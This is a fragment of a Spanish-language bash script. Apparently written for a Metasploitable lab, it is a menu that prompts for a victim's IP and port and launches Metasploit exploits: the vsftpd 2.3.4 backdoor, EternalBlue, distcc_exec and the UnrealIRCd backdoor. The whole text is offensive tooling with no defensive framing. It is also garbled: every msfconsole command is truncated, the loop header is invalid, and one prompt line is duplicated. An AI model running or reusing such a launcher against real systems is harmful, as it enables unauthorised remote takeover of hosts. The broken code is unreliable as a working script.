


while i_metasploitable in
do
	case $i_metasploitable in
		1)
			echo "Introduce la IP de la víctima:"
			read rhosts

			echo "Introduce el puerto: (21 por defecto)"
			read rport

			msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;set payload cmd/un>"
		;;
		2) 
			read -p "Introduce la IP de la victima: " rhosts
			msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set R>"
		;;
		3)
			read -p "Introduce la IP de la victima: " rhosts
			read -p "Introduce el puerto para atacar (3632 por defecto)" rport
			msfconsole -q -x "use exploit/unix/misc/distcc_exec ; set RHOSTS $rho>"
		;;
		4)
			read -p  read -p "Introduce la IP de la victima:" rhosts
			read -p "Introduce el puerto para atacar (6667 por defecto)" rport
			msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor ; se>"
		;;
	esac


done
